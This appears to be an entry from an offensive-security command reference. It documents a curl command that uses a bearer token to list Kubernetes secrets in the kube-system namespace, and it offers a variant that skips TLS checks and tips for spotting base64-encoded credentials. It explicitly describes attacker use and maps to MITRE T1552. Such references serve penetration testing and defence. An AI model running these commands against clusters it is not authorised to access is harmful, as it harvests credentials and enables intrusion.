---
id: c02a0177-8eac-45aa-aac2-3ab5d97dcbdf
name: curl-kubernetes-list-secrets
type: command
executor: bash
data: >-
  curl -v -H "Authorization: Bearer $_JWT_TOKEN"
  https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/
output: null
created_at: '2023-04-06T03:56:01.199447+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Kubernetes
tags:
  - Kubernetes
  - API Query
  - Secrets
verified: true
validated: true
---

# curl-kubernetes-list-secrets

## Command

```bash
curl -v -H "Authorization: Bearer $_JWT_TOKEN" https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/
```

## Description

This command queries the Kubernetes API server to list all secrets in the kube-system namespace using bearer token authentication. It is used in scenarios where an attacker has a valid JWT token with list permissions to discover stored credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_JWT_TOKEN | Valid JWT bearer token for API authentication | Yes |
| $_MASTER_IP | IP address of the Kubernetes master node | Yes |
| $_PORT | API server port (default 6443) | Yes |
| -v | Verbose output to show request/response details | No |
| -H | Header specification for Authorization | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." https://192.168.1.100:6443/api/v1/namespaces/kube-system/secrets/
```

### Advanced Usage

Add --insecure to bypass TLS verification if using self-signed certs:

```bash
curl -v --insecure -H "Authorization: Bearer $_JWT_TOKEN" https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/
```

## Expected Output

Successful execution returns a JSON response with a list of secrets:

```json
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "items": [
    {
      "metadata": {
        "name": "default-sa-token-abc123",
        "namespace": "kube-system"
      },
      "type": "kubernetes.io/service-account-token",
      "data": {
        "token": "...base64 encoded..."
      }
    }
  ]
}
```
Look for 'data' fields containing base64-encoded sensitive information. A 403 error indicates RBAC denial.

## Related

- [[procedures/Kubernetes-RBAC-List-Secrets]] (procedure using this command)
- [[techniques/Unsecured Credentials|T1552]] (MITRE technique)
